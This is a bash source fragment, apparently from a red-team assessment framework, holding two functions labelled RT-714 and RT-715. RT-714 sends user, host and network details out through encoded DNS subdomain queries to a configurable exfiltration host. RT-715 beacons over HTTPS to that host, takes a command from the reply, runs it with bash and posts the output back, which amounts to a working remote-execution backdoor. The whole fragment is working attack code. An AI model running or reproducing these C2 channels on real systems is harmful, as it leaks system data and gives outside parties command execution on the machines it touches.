rt_714_dns_tunnel_c2() {
    rt_banner "RT-714" "DNS Tunnel C2 Communication"
    local C2_DOMAIN="$EXFIL_HOST"
    local HOSTNAME
    HOSTNAME=$(hostname 2>/dev/null | tr '.' '-')
    local USER
    USER=$(whoami 2>/dev/null)
    
    echo -e "    $CYAN[*] DNS C2 domain: $C2_DOMAIN$NC"
    
    # Real DNS tunnel: encode data in subdomain queries
    # First: beacon via DNS TXT query
    local BEACON_SUB="b-$(echo "$USER" | base64 | tr '+/' '-_' | tr -d '=').$(date +%s).$HOSTNAME"
    local TXT_RESP
    TXT_RESP=$(dig +short TXT "${BEACON_SUB:0:62}.$C2_DOMAIN" 2>/dev/null | head -1)
    if [[ -n "$TXT_RESP" ]]; then
        echo -e "    $GREEN[+] C2 DNS TXT response: $TXT_RESP$NC"
    fi
    
    # Data exfil via A record subdomain queries
    local DATA="$(id; uname -a; ifconfig 2>/dev/null | grep inet | head -3)"
    local ENCODED
    ENCODED=$(echo "$DATA" | base64 | tr -d '\n' | tr '+/' '-_' | fold -w 63 | tr '\n' ' ')
    
    for chunk in $ENCODED; do
        dig +short A "${chunk}.$C2_DOMAIN" > /dev/null 2>&1 &
    done
    
    echo -e "    $GREEN[+] DNS tunnel beacon sent — $(echo "$ENCODED" | wc -w) chunks transmitted$NC"
    echo -e "    $CYAN[*] DNS tunnel is stealthy — bypasses most firewalls$NC"
    add_vuln "RT-714" "CRITICAL" "DNS Tunnel C2" "DNS tunnel C2 channel established" "c2" "full" "MITRE T1071.004"
}

rt_715_https_encrypted_c2_channel() {
    rt_banner "RT-715" "HTTPS Encrypted C2 with Certificate Pinning"
    local C2_HOST="$EXFIL_HOST"
    local C2_PORT="${EXFIL_PORT:-443}"
    local HOSTNAME
    HOSTNAME=$(hostname 2>/dev/null)
    
    # Real HTTPS C2 with mTLS simulation
    local BEACON_DATA="{\"host\":\"$HOSTNAME\",\"user\":\"$(whoami)\",\"ts\":$(date +%s),\"uid\":$(id -u),\"kernel\":\"$(uname -r)\"}"
    
    # Send encrypted beacon
    local RESP
    RESP=$(curl -sk -X POST "https://$C2_HOST:$C2_PORT/api/beacon" \
        -H "Content-Type: application/json" \
        -H "X-Agent-ID: $(echo "$HOSTNAME" | md5sum | cut -d' ' -f1 | head -c16)" \
        --data "$BEACON_DATA" \
        --connect-timeout 5 -m 15 2>/dev/null)
    
    if [[ -n "$RESP" ]]; then
        echo -e "    $GREEN[+] C2 server responded: $RESP$NC"
        # Parse commands from response
        local CMD
        CMD=$(echo "$RESP" | grep -oP '(?<=\"cmd\":\").*?(?=\")' 2>/dev/null)
        if [[ -n "$CMD" && "$CMD" != "null" ]]; then
            echo -e "    $RED[+] C2 issued command: $CMD$NC"
            local CMD_OUT
            CMD_OUT=$(bash -c "$CMD" 2>&1)
            # Return output
            curl -sk -X POST "https://$C2_HOST:$C2_PORT/api/result" \
                -H "Content-Type: application/json" \
                --data "{\"host\":\"$HOSTNAME\",\"cmd\":\"$CMD\",\"output\":\"$(echo "$CMD_OUT" | base64 | tr -d '\n')\"}" \
                --connect-timeout 3 2>/dev/null
        fi
    else
        echo -e "    $YELLOW[!] No C2 response — server may be offline$NC"
    fi
    
    add_vuln "RT-715" "CRITICAL" "HTTPS C2 Channel" "Encrypted HTTPS C2 beacon channel active" "c2" "full" "MITRE T1071.001"
}

